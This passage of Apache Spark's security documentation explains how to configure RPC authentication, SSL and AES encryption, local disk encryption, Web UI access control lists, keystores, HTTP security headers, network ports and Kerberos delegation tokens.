support.\n\n# Spark RPC (Communication protocol between Spark processes)\n\n## Authentication\n\nSpark currently supports authentication for RPC channels using a shared secret. Authentication can\nbe turned on by setting the `spark.authenticate` configuration parameter.\n\nThe exact mechanism used to generate and distribute the shared secret is deployment-specific. Unless\nspecified below, the secret must be defined by setting the `spark.authenticate.secret` config\noption. The same secret is shared by all Spark applications and daemons in that case, which limits\nthe security of these deployments, especially on multi-tenant clusters.\n\nThe REST Submission Server supports HTTP `Authorization` header with\na cryptographically signed JSON Web Token via `JWSFilter`.\nTo enable authorization, Spark Master should have\n`spark.master.rest.filters=org.apache.spark.ui.JWSFilter` and\n`spark.org.apache.spark.ui.JWSFilter.param.secretKey=BASE64URL-ENCODED-KEY` configurations, and\nclient should provide HTTP `Authorization` header which contains JSON Web Token signed by\nthe shared secret key. Please note that this feature requires a Spark distribution built with\n`jjwt` profile.\n\n### YARN\n\nFor Spark on [YARN](running-on-yarn.html), Spark will automatically handle generating and\ndistributing the shared secret. Each application will use a unique shared secret. In\nthe case of YARN, this feature relies on YARN RPC encryption being enabled for the distribution of\nsecrets to be secure.\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.yarn.shuffle.server.recovery.disabled</code></td>\n  <td>false</td>\n  <td>\n    Set to true for applications that have higher security requirements and prefer that their\n    secret is not saved in the db. The shuffle data of such applications wll not be recovered after\n    the External Shuffle Service restarts.\n  </td>\n  <td>3.5.0</td>\n</tr>\n</table>\n\n### Kubernetes\n\nOn Kubernetes, Spark will also automatically generate an authentication secret unique to each\napplication. The secret is propagated to executor pods using environment variables. This means\nthat any user that can list pods in the namespace where the Spark application is running can\nalso see their authentication secret. Access control rules should be properly set up by the\nKubernetes admin to ensure that Spark authentication is secure.\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.authenticate</code></td>\n  <td>false</td>\n  <td>Whether Spark authenticates its internal connections.</td>\n  <td>1.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.authenticate.secret</code></td>\n  <td>None</td>\n  <td>\n    The secret key used authentication. See above for when this configuration should be set.\n  </td>\n  <td>1.0.0</td>\n</tr>\n</table>\n\nAlternatively, one can mount authentication secrets using files and Kubernetes secrets that\nthe user mounts into their pods.\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.authenticate.secret.file</code></td>\n  <td>None</td>\n  <td>\n    Path pointing to the secret key to use for securing connections. Ensure that the\n    contents of the file have been securely generated. This file is loaded on both the driver\n    and the executors unless other settings override this (see below).\n  </td>\n  <td>3.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.authenticate.secret.driver.file</code></td>\n  <td>The value of <code>spark.authenticate.secret.file</code></td>\n  <td>\n    When specified, overrides the location that the Spark driver reads to load the secret.\n    Useful when in client mode, when the location of the secret file may differ in the pod versus\n    the node the driver is running in. When this is specified,\n    <code>spark.authenticate.secret.executor.file</code> must be specified so that the driver\n    and the executors can both use files to load the secret key. Ensure that the contents of the file\n    on the driver is identical to the contents of the file on the executors.\n  </td>\n  <td>3.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.authenticate.secret.executor.file</code></td>\n  <td>The value of <code>spark.authenticate.secret.file</code></td>\n  <td>\n    When specified, overrides the location that the Spark executors read to load the secret.\n    Useful in client mode, when the location of the secret file may differ in the pod versus\n    the node the driver is running in. When this is specified,\n    <code>spark.authenticate.secret.driver.file</code> must be specified so that the driver\n    and the executors can both use files to load the secret key. Ensure that the contents of the file\n    on the driver is identical to the contents of the file on the executors.\n  </td>\n  <td>3.0.0</td>\n</tr>\n</table>\n\nNote that when using files, Spark will not mount these files into the containers for you. It is up\nyou to ensure that the secret files are deployed securely into your containers and that the driver's\nsecret file agrees with the executors' secret file.\n\n# Network Encryption\n\nSpark supports two mutually exclusive forms of encryption for RPC connections:\n\nThe **preferred method** uses TLS (aka SSL) encryption via Netty's support for SSL. Enabling SSL\nrequires keys and certificates to be properly configured. SSL is standardized and considered more\nsecure.\n\nThe legacy method is an AES-based encryption mechanism relying on a shared secret. This requires\nRPC authentication to also be enabled. This method uses a bespoke protocol and it is recommended\nto use SSL instead.\n\nOne may prefer to use the SSL based encryption in scenarios where compliance mandates the usage\nof specific protocols; or to leverage the security of a more standard encryption library. However,\nthe AES based encryption is simpler to configure and may be preferred if the only requirement\nis that data be encrypted in transit.\n\nIf both options are enabled in the configuration, the SSL based RPC encryption takes precedence\nand the AES based encryption will not be used (and a warning message will be emitted).\n\n## SSL Encryption (Preferred)\n\nSpark supports SSL based encryption for RPC connections. Please refer to the SSL Configuration\nsection below to understand how to configure it. The SSL settings are mostly similar across the UI\nand RPC, however there are a few additional settings which are specific to the RPC implementation.\nThe RPC implementation uses Netty under the hood (while the UI uses Jetty), which supports a\ndifferent set of options.\n\nUnlike the other SSL settings for the UI, the RPC SSL is *not* automatically enabled if\n`spark.ssl.enabled` is set. It must be explicitly enabled, to ensure a safe migration path for users\nupgrading Spark versions.\n\n## AES-based Encryption (Legacy)\n\nSpark supports AES-based encryption for RPC connections. For encryption to be enabled, RPC\nauthentication must also be enabled and properly configured. AES encryption uses the\n[Apache Commons Crypto](https://commons.apache.org/proper/commons-crypto/) library, and Spark's\nconfiguration system allows access to that library's configuration for advanced users.\n\nThis legacy protocol has two mutually incompatible versions. Version 1 omits applying key derivation function\n(KDF) to the key exchange protocol's output, while version 2 applies a KDF to ensure that the derived session\nkey is uniformly distributed. Version 1 is default for backward compatibility. It is **recommended to use version 2**\nfor better security properties. The version can be configured by setting `spark.network.crypto.authEngineVersion` to\n1 or 2 respectively.\n\nThere is also support for SASL-based encryption, although it should be considered deprecated. It\nis still required when talking to shuffle services from Spark versions older than 2.2.0.\n\nThe following table describes the different options available for configuring this feature.\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.network.crypto.enabled</code></td>\n  <td>false</td>\n  <td>\n    Enable AES-based RPC encryption, including the new authentication protocol added in 2.2.0.\n  </td>\n  <td>2.2.0</td>\n</tr>\n<tr>\n  <td><code>spark.network.crypto.cipher</code></td>\n  <td>AES/CTR/NoPadding</td>\n  <td>\n    Cipher mode to use. Defaults \"AES/CTR/NoPadding\" for backward compatibility, which is not authenticated. \n    Recommended to use \"AES/GCM/NoPadding\", which is an authenticated encryption mode.\n  </td>\n  <td>4.0.0, 3.5.2, 3.4.4</td>\n</tr>\n<tr>\n  <td><code>spark.network.crypto.authEngineVersion</code></td>\n  <td>1</td>\n  <td>Version of AES-based RPC encryption to use. Valid versions are 1 or 2. Version 2 is recommended.</td>\n  <td>4.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.network.crypto.config.*</code></td>\n  <td>None</td>\n  <td>\n    Configuration values for the commons-crypto library, such as which cipher implementations to\n    use. The config name should be the name of commons-crypto configuration without the\n    <code>commons.crypto</code> prefix.\n  </td>\n  <td>2.2.0</td>\n</tr>\n<tr>\n  <td><code>spark.network.crypto.saslFallback</code></td>\n  <td>true</td>\n  <td>\n    Whether to fall back to SASL authentication if authentication fails using Spark's internal\n    mechanism. This is useful when the application is connecting to old shuffle services that\n    do not support the internal Spark authentication protocol. On the shuffle service side,\n    disabling this feature will block older clients from authenticating.\n  </td>\n  <td>2.2.0</td>\n</tr>\n<tr>\n  <td><code>spark.authenticate.enableSaslEncryption</code></td>\n  <td>false</td>\n  <td>\n    Enable SASL-based encrypted communication.\n  </td>\n  <td>2.2.0</td>\n</tr>\n<tr>\n  <td><code>spark.network.sasl.serverAlwaysEncrypt</code></td>\n  <td>false</td>\n  <td>\n    Disable unencrypted connections for ports using SASL authentication. This will deny connections\n    from clients that have authentication enabled, but do not request SASL-based encryption.\n  </td>\n  <td>1.4.0</td>\n</tr>\n</table>\n\n# Local Storage Encryption\n\nSpark supports encrypting temporary data written to local disks. This covers shuffle files, shuffle\nspills and data blocks stored on disk (for both caching and broadcast variables). It does not cover\nencrypting output data generated by applications with APIs such as `saveAsHadoopFile` or\n`saveAsTable`. It also may not cover temporary files created explicitly by the user.\n\nThe following settings cover enabling encryption for data written to disk:\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.io.encryption.enabled</code></td>\n  <td>false</td>\n  <td>\n    Enable local disk I/O encryption. Currently supported by all modes. It's strongly\n    recommended that RPC encryption be enabled when using this feature.\n  </td>\n  <td>2.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.io.encryption.keySizeBits</code></td>\n  <td>128</td>\n  <td>\n    IO encryption key size in bits. Supported values are 128, 192 and 256.\n  </td>\n  <td>2.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.io.encryption.keygen.algorithm</code></td>\n  <td>HmacSHA1</td>\n  <td>\n    The algorithm to use when generating the IO encryption key. The supported algorithms are\n    described in the KeyGenerator section of the Java Cryptography Architecture Standard Algorithm\n    Name Documentation.\n  </td>\n  <td>2.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.io.encryption.commons.config.*</code></td>\n  <td>None</td>\n  <td>\n    Configuration values for the commons-crypto library, such as which cipher implementations to\n    use. The config name should be the name of commons-crypto configuration without the\n    <code>commons.crypto</code> prefix.\n  </td>\n  <td>2.1.0</td>\n</tr>\n</table>\n\n\n# Web UI\n\n## Authentication and Authorization\n\nEnabling authentication for the Web UIs is done using [jakarta servlet filters](https://jakarta.ee/specifications/servlet/5.0/apidocs/jakarta/servlet/filter).\nYou will need a filter that implements the authentication method you want to deploy. Spark does not\nprovide any built-in authentication filters.\n\nSpark also supports access control to the UI when an authentication filter is present. Each\napplication can be configured with its own separate access control lists (ACLs). Spark\ndifferentiates between \"view\" permissions (who is allowed to see the application's UI), and \"modify\"\npermissions (who can do things like kill jobs in a running application).\n\nACLs can be configured for either users or groups. Configuration entries accept comma-separated\nlists as input, meaning multiple users or groups can be given the desired privileges. This can be\nused if you run on a shared cluster and have a set of administrators or developers who need to\nmonitor applications they may not have started themselves. A wildcard (`*`) added to specific ACL\nmeans that all users will have the respective privilege. By default, only the user submitting the\napplication is added to the ACLs.\n\nGroup membership is established by using a configurable group mapping provider. The mapper is\nconfigured using the <code>spark.user.groups.mapping</code> config option, described in the table\nbelow.\n\nThe following options control the authentication of Web UIs:\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.ui.allowFramingFrom</code></td>\n  <td><code>SAMEORIGIN</code></td>\n  <td>Allow framing for a specific named URI via <code>X-Frame-Options</code>. By default, allow only from the same origin.</td>\n  <td>1.6.0</td>\n</tr>\n<tr>\n  <td><code>spark.ui.filters</code></td>\n  <td>None</td>\n  <td>\n    Spark supports HTTP <code>Authorization</code> header with a cryptographically signed\n    JSON Web Token via <code>org.apache.spark.ui.JWSFilter</code>. <br />\n    See the <a href=\"configuration.html#spark-ui\">Spark UI</a> configuration for how to configure\n    filters.\n  </td>\n  <td>1.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.acls.enable</code></td>\n  <td>false</td>\n  <td>\n    Whether UI ACLs should be enabled. If enabled, this checks to see if the user has access\n    permissions to view or modify the application. Note this requires the user to be authenticated,\n    so if no authentication filter is installed, this option does not do anything.\n  </td>\n  <td>1.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.admin.acls</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of users that have view and modify access to the Spark application.\n  </td>\n  <td>1.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.admin.acls.groups</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of groups that have view and modify access to the Spark application.\n  </td>\n  <td>2.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.modify.acls</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of users that have modify access to the Spark application.\n  </td>\n  <td>1.1.0</td>\n</tr>\n<tr>\n  <td><code>spark.modify.acls.groups</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of groups that have modify access to the Spark application.\n  </td>\n  <td>2.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.ui.view.acls</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of users that have view access to the Spark application.\n  </td>\n  <td>1.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.ui.view.acls.groups</code></td>\n  <td>None</td>\n  <td>\n    Comma-separated list of groups that have view access to the Spark application.\n  </td>\n  <td>2.0.0</td>\n</tr>\n<tr>\n  <td><code>spark.user.groups.mapping</code></td>\n  <td><code>org.apache.spark.security.ShellBasedGroupsMappingProvider</code></td>\n  <td>\n    The list of groups for a user is determined by a group mapping service defined by the trait\n    <code>org.apache.spark.security.GroupMappingServiceProvider</code>, which can be configured by\n    this property.\n\n    <br />By default, a Unix shell-based implementation is used, which collects this information\n    from the host OS.\n\n    <br /><em>Note:</em> This implementation supports only Unix/Linux-based environments.\n    Windows environment is currently <b>not</b> supported. However, a new platform/protocol can\n    be supported by implementing the trait mentioned above.\n  </td>\n  <td>2.0.0</td>\n</tr>\n</table>\n\nOn YARN, the view and modify ACLs are provided to the YARN service when submitting applications, and\ncontrol who has the respective privileges via YARN interfaces.\n\n## Spark History Server ACLs\n\nAuthentication for the SHS Web UI is enabled the same way as for regular applications, using\nservlet filters.\n\nTo enable authorization in the SHS, a few extra options are used:\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.history.ui.acls.enable</code></td>\n  <td>false</td>\n  <td>\n    Specifies whether ACLs should be checked to authorize users viewing the applications in\n    the history server. If enabled, access control checks are performed regardless of what the\n    individual applications had set for <code>spark.ui.acls.enable</code>. The application owner\n    will always have authorization to view their own application and any users specified via\n    <code>spark.ui.view.acls</code> and groups specified via <code>spark.ui.view.acls.groups</code>\n    when the application was run will also have authorization to view that application.\n    If disabled, no access control checks are made for any application UIs available through\n    the history server.\n  </td>\n  <td>1.0.1</td>\n</tr>\n<tr>\n  <td><code>spark.history.ui.admin.acls</code></td>\n  <td>None</td>\n  <td>\n    Comma separated list of users that have view access to all the Spark applications in history\n    server.\n  </td>\n  <td>2.1.1</td>\n</tr>\n<tr>\n  <td><code>spark.history.ui.admin.acls.groups</code></td>\n  <td>None</td>\n  <td>\n    Comma separated list of groups that have view access to all the Spark applications in history\n    server.\n  </td>\n  <td>2.1.1</td>\n</tr>\n</table>\n\nThe SHS uses the same options to configure the group mapping provider as regular applications.\nIn this case, the group mapping provider will apply to all UIs server by the SHS, and individual\napplication configurations will be ignored.\n\n## SSL Configuration\n\nConfiguration for SSL is organized hierarchically. The user can configure the default SSL settings\nwhich will be used for all the supported communication protocols unless they are overwritten by\nprotocol-specific settings. This way the user can easily provide the common settings for all the\nprotocols without disabling the ability to configure each one individually. Note that all settings \nare inherited this way, *except* for `spark.ssl.rpc.enabled` which must be explicitly set.\n\nThe following table describes the SSL configuration namespaces:\n\n<table>\n  <thead>\n  <tr>\n    <th>Config Namespace</th>\n    <th>Component</th>\n  </tr>\n  </thead>\n  <tr>\n    <td><code>spark.ssl</code></td>\n    <td>\n      The default SSL configuration. These values will apply to all namespaces below, unless\n      explicitly overridden at the namespace level.\n    </td>\n  </tr>\n  <tr>\n    <td><code>spark.ssl.ui</code></td>\n    <td>Spark application Web UI</td>\n  </tr>\n  <tr>\n    <td><code>spark.ssl.standalone</code></td>\n    <td>Standalone Master / Worker Web UI</td>\n  </tr>\n  <tr>\n    <td><code>spark.ssl.historyServer</code></td>\n    <td>History Server Web UI</td>\n  </tr>\n  <tr>\n    <td><code>spark.ssl.rpc</code></td>\n    <td>Spark RPC communication</td>\n  </tr>\n</table>\n\nThe full breakdown of available SSL options can be found below. The `${ns}` placeholder should be\nreplaced with one of the above namespaces.\n\n<table>\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Supported Namespaces</th></tr></thead>\n  <tr>\n    <td><code>${ns}.enabled</code></td>\n    <td>false</td>\n    <td>Enables SSL. When enabled, <code>${ns}.ssl.protocol</code> is required.</td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.port</code></td>\n    <td>None</td>\n    <td>\n      The port where the SSL service will listen on.\n\n      <br />The port must be defined within a specific namespace configuration. The default\n      namespace is ignored when reading this configuration.\n\n      <br />When not set, the SSL port will be derived from the non-SSL port for the\n      same service. A value of \"0\" will make the service bind to an ephemeral port.\n    </td>\n    <td>ui,standalone,historyServer</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.enabledAlgorithms</code></td>\n    <td>None</td>\n    <td>\n      A comma-separated list of ciphers. The specified ciphers must be supported by JVM.\n\n      <br />The reference list of protocols can be found in the \"JSSE Cipher Suite Names\" section\n      of the Java security guide. The list for Java 17 can be found at\n      <a href=\"https://docs.oracle.com/en/java/javase/17/docs/specs/security/standard-names.html#jsse-cipher-suite-names\">this</a>\n      page.\n\n      <br />Note: If not set, the default cipher suite for the JRE will be used.\n    </td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.keyPassword</code></td>\n    <td>None</td>\n    <td>\n      The password to the private key in the key store.\n    </td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.keyStore</code></td>\n    <td>None</td>\n    <td>\n      Path to the key store file. The path can be absolute or relative to the directory in which the\n      process is started.\n    </td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.keyStorePassword</code></td>\n    <td>None</td>\n    <td>Password to the key store.</td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.keyStoreType</code></td>\n    <td>JKS</td>\n    <td>The type of the key store.</td>\n    <td>ui,standalone,historyServer</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.protocol</code></td>\n    <td>None</td>\n    <td>\n      TLS protocol to use. The protocol must be supported by JVM.\n\n      <br />The reference list of protocols can be found in the \"Additional JSSE Standard Names\"\n      section of the Java security guide. For Java 17, the list can be found at\n      <a href=\"https://docs.oracle.com/en/java/javase/17/docs/specs/security/standard-names.html#additional-jsse-standard-names\">this</a>\n      page.\n    </td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.needClientAuth</code></td>\n    <td>false</td>\n    <td>\n      Whether to require client authentication.\n    </td>\n    <td>ui,standalone,historyServer</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.trustStore</code></td>\n    <td>None</td>\n    <td>\n      Path to the trust store file. The path can be absolute or relative to the directory in which\n      the process is started.\n    </td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.trustStorePassword</code></td>\n    <td>None</td>\n    <td>Password for the trust store.</td>\n    <td>ui,standalone,historyServer,rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.trustStoreType</code></td>\n    <td>JKS</td>\n    <td>The type of the trust store.</td>\n    <td>ui,standalone,historyServer</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.openSSLEnabled</code></td>\n    <td>false</td>\n    <td>\n      Whether to use OpenSSL for cryptographic operations instead of the JDK SSL provider.\n      This setting requires the `certChain` and `privateKey` settings to be set.\n      This takes precedence over the `keyStore` and `trustStore` settings if both are specified.\n      If the OpenSSL library is not available at runtime, we will fall back to the JDK provider.\n    </td>\n    <td>rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.privateKey</code></td>\n    <td>None</td>\n    <td>\n      Path to the private key file in PEM format. The path can be absolute or relative to the \n      directory in which the process is started. \n      This setting is required when using the OpenSSL implementation.\n    </td>\n    <td>rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.privateKeyPassword</code></td>\n    <td>None</td>\n    <td>\n      The password to the above private key file in PEM format.\n    </td>\n    <td>rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.certChain</code></td>\n    <td>None</td>\n    <td>\n      Path to the certificate chain file in PEM format. The path can be absolute or relative to the \n      directory in which the process is started. \n      This setting is required when using the OpenSSL implementation.\n    </td>\n    <td>rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.trustStoreReloadingEnabled</code></td>\n    <td>false</td>\n    <td>\n      Whether the trust store should be reloaded periodically.\n      This setting is mostly only useful in standalone deployments, not k8s or yarn deployments.\n    </td>\n    <td>rpc</td>\n  </tr>\n  <tr>\n    <td><code>${ns}.trustStoreReloadIntervalMs</code></td>\n    <td>10000</td>\n    <td>\n      The interval at which the trust store should be reloaded (in milliseconds).\n      This setting is mostly only useful in standalone deployments, not k8s or yarn deployments.\n    </td>\n    <td>rpc</td>\n  </tr>\n</table>\n\nSpark also supports retrieving `${ns}.keyPassword`, `${ns}.keyStorePassword` and `${ns}.trustStorePassword` from\n[Hadoop Credential Providers](https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/CredentialProviderAPI.html).\nUser could store password into credential file and make it accessible by different components, like:\n\n```\nhadoop credential create spark.ssl.keyPassword -value password \\\n    -provider jceks://hdfs@nn1.example.com:9001/user/backup/ssl.jceks\n```\n\nTo configure the location of the credential provider, set the `hadoop.security.credential.provider.path`\nconfig option in the Hadoop configuration used by Spark, like:\n\n```\n  <property>\n    <name>hadoop.security.credential.provider.path</name>\n    <value>jceks://hdfs@nn1.example.com:9001/user/backup/ssl.jceks</value>\n  </property>\n```\n\nOr via SparkConf \"spark.hadoop.hadoop.security.credential.provider.path=jceks://hdfs@nn1.example.com:9001/user/backup/ssl.jceks\".\n\n## Preparing the key stores\n\nKey stores can be generated by `keytool` program. The reference documentation for this tool for\nJava 17 is [here](https://docs.oracle.com/en/java/javase/17/docs/specs/man/keytool.html).\nThe most basic steps to configure the key stores and the trust store for a Spark Standalone\ndeployment mode is as follows:\n\n* Generate a key pair for each node\n* Export the public key of the key pair to a file on each node\n* Import all exported public keys into a single trust store\n* Distribute the trust store to the cluster nodes\n\n### YARN mode\n\nTo provide a local trust store or key store file to drivers running in cluster mode, they can be\ndistributed with the application using the `--files` command line argument (or the equivalent\n`spark.files` configuration). The files will be placed on the driver's working directory, so the TLS\nconfiguration should just reference the file name with no absolute path.\n\nDistributing local key stores this way may require the files to be staged in HDFS (or other similar\ndistributed file system used by the cluster), so it's recommended that the underlying file system be\nconfigured with security in mind (e.g. by enabling authentication and wire encryption).\n\n### Standalone mode\n\nThe user needs to provide key stores and configuration options for master and workers. They have to\nbe set by attaching appropriate Java system properties in `SPARK_MASTER_OPTS` and in\n`SPARK_WORKER_OPTS` environment variables, or just in `SPARK_DAEMON_JAVA_OPTS`.\n\nThe user may allow the executors to use the SSL settings inherited from the worker process. That\ncan be accomplished by setting `spark.ssl.useNodeLocalConf` to `true`. In that case, the settings\nprovided by the user on the client side are not used.\n\n## HTTP Security Headers\n\nApache Spark can be configured to include HTTP headers to aid in preventing Cross Site Scripting\n(XSS), Cross-Frame Scripting (XFS), MIME-Sniffing, and also to enforce HTTP Strict Transport\nSecurity.\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.ui.xXssProtection</code></td>\n  <td><code>1; mode=block</code></td>\n  <td>\n    Value for HTTP X-XSS-Protection response header. You can choose appropriate value\n    from below:\n    <ul>\n      <li><code>0</code> (Disables XSS filtering)</li>\n      <li><code>1</code> (Enables XSS filtering. If a cross-site scripting attack is detected,\n        the browser will sanitize the page.)</li>\n      <li><code>1; mode=block</code> (Enables XSS filtering. The browser will prevent rendering\n        of the page if an attack is detected.)</li>\n    </ul>\n  </td>\n  <td>2.3.0</td>\n</tr>\n<tr>\n  <td><code>spark.ui.xContentTypeOptions.enabled</code></td>\n  <td><code>true</code></td>\n  <td>\n    When enabled, X-Content-Type-Options HTTP response header will be set to \"nosniff\".\n  </td>\n  <td>2.3.0</td>\n</tr>\n<tr>\n  <td><code>spark.ui.strictTransportSecurity</code></td>\n  <td>None</td>\n  <td>\n    Value for HTTP Strict Transport Security (HSTS) Response Header. You can choose appropriate\n    value from below and set <code>expire-time</code> accordingly. This option is only used when\n    SSL/TLS is enabled.\n    <ul>\n      <li><code>max-age=&lt;expire-time&gt;</code></li>\n      <li><code>max-age=&lt;expire-time&gt;; includeSubDomains</code></li>\n      <li><code>max-age=&lt;expire-time&gt;; preload</code></li>\n    </ul>\n  </td>\n  <td>2.3.0</td>\n</tr>\n</table>\n\n\n# Configuring Ports for Network Security\n\nGenerally speaking, a Spark cluster and its services are not deployed on the public internet.\nThey are generally private services, and should only be accessible within the network of the\norganization that deploys Spark. Access to the hosts and ports used by Spark services should\nbe limited to origin hosts that need to access the services.\n\nHowever, like the REST Submission port, Spark also supports HTTP `Authorization` header\nwith a cryptographically signed JSON Web Token (JWT) for all UI ports.\nTo use it, a user needs the Spark distribution built with `jjwt` profile and to configure\n`spark.ui.filters=org.apache.spark.ui.JWSFilter` and\n`spark.org.apache.spark.ui.JWSFilter.param.secretKey=BASE64URL-ENCODED-KEY`.\n\nBelow are the primary ports that Spark uses for its communication and how to\nconfigure those ports.\n\n## Standalone mode only\n\n<table>\n  <thead>\n  <tr>\n    <th>From</th><th>To</th><th>Default Port</th><th>Purpose</th><th>Configuration\n    Setting</th><th>Notes</th>\n  </tr>\n  </thead>\n  <tr>\n    <td>Browser</td>\n    <td>Standalone Master</td>\n    <td>8080</td>\n    <td>Web UI</td>\n    <td><code>spark.master.ui.port /<br> SPARK_MASTER_WEBUI_PORT</code></td>\n    <td>Jetty-based. Standalone mode only.</td>\n  </tr>\n  <tr>\n    <td>Browser</td>\n    <td>Standalone Worker</td>\n    <td>8081</td>\n    <td>Web UI</td>\n    <td><code>spark.worker.ui.port /<br> SPARK_WORKER_WEBUI_PORT</code></td>\n    <td>Jetty-based. Standalone mode only.</td>\n  </tr>\n  <tr>\n    <td>Driver /<br> Standalone Worker</td>\n    <td>Standalone Master</td>\n    <td>7077</td>\n    <td>Submit job to cluster /<br> Join cluster</td>\n    <td><code>SPARK_MASTER_PORT</code></td>\n    <td>Set to \"0\" to choose a port randomly. Standalone mode only.</td>\n  </tr>\n  <tr>\n    <td>External Service</td>\n    <td>Standalone Master</td>\n    <td>6066</td>\n    <td>Submit job to cluster via REST API</td>\n    <td><code>spark.master.rest.port</code></td>\n    <td>Use <code>spark.master.rest.enabled</code> to enable/disable this service. Standalone mode only.</td>\n  </tr>\n  <tr>\n    <td>Standalone Master</td>\n    <td>Standalone Worker</td>\n    <td>(random)</td>\n    <td>Schedule executors</td>\n    <td><code>SPARK_WORKER_PORT</code></td>\n    <td>Set to \"0\" to choose a port randomly. Standalone mode only.</td>\n  </tr>\n</table>\n\n## All cluster managers\n\n<table>\n  <thead>\n  <tr>\n    <th>From</th><th>To</th><th>Default Port</th><th>Purpose</th><th>Configuration\n    Setting</th><th>Notes</th>\n  </tr>\n  </thead>\n  <tr>\n    <td>Browser</td>\n    <td>Application</td>\n    <td>4040</td>\n    <td>Web UI</td>\n    <td><code>spark.ui.port</code></td>\n    <td>Jetty-based</td>\n  </tr>\n  <tr>\n    <td>Browser</td>\n    <td>History Server</td>\n    <td>18080</td>\n    <td>Web UI</td>\n    <td><code>spark.history.ui.port</code></td>\n    <td>Jetty-based</td>\n  </tr>\n  <tr>\n    <td>Executor /<br> Standalone Master</td>\n    <td>Driver</td>\n    <td>(random)</td>\n    <td>Connect to application /<br> Notify executor state changes</td>\n    <td><code>spark.driver.port</code></td>\n    <td>Set to \"0\" to choose a port randomly.</td>\n  </tr>\n  <tr>\n    <td>Executor / Driver</td>\n    <td>Executor / Driver</td>\n    <td>(random)</td>\n    <td>Block Manager port</td>\n    <td><code>spark.blockManager.port</code></td>\n    <td>Raw socket via ServerSocketChannel</td>\n  </tr>\n</table>\n\n\n# Kerberos\n\nSpark supports submitting applications in environments that use Kerberos for authentication.\nIn most cases, Spark relies on the credentials of the current logged in user when authenticating\nto Kerberos-aware services. Such credentials can be obtained by logging in to the configured KDC\nwith tools like `kinit`.\n\nWhen talking to Hadoop-based services, Spark needs to obtain delegation tokens so that non-local\nprocesses can authenticate. Spark ships with support for HDFS and other Hadoop file systems, Hive\nand HBase.\n\nWhen using a Hadoop filesystem (such HDFS or WebHDFS), Spark will acquire the relevant tokens\nfor the service hosting the user's home directory.\n\nAn HBase token will be obtained if HBase is in the application's classpath, and the HBase\nconfiguration has Kerberos authentication turned (`hbase.security.authentication=kerberos`).\n\nSimilarly, a Hive token will be obtained if Hive is in the classpath, and the configuration includes\nURIs for remote metastore services (`hive.metastore.uris` is not empty).\n\nIf an application needs to interact with other secure Hadoop filesystems, their URIs need to be\nexplicitly provided to Spark at launch time. This is done by listing them in the\n`spark.kerberos.access.hadoopFileSystems` property, described in the configuration section below.\n\nSpark also supports custom delegation token providers using the Java Services\nmechanism (see `java.util.ServiceLoader`). Implementations of\n`org.apache.spark.security.HadoopDelegationTokenProvider` can be made available to Spark\nby listing their names in the corresponding file in the jar's `META-INF/services` directory.\n\nDelegation token support is currently only supported in YARN and Kubernetes mode. Consult the\ndeployment-specific page for more information.\n\nThe following options provides finer-grained control for this feature:\n\n<table class=\"spark-config\">\n<thead><tr><th>Property Name</th><th>Default</th><th>Meaning</th><th>Since Version</th></tr></thead>\n<tr>\n  <td><code>spark.security.credentials.${service}.enabled</code></td>\n  <td><code>true</code></td>\n  <td>\n    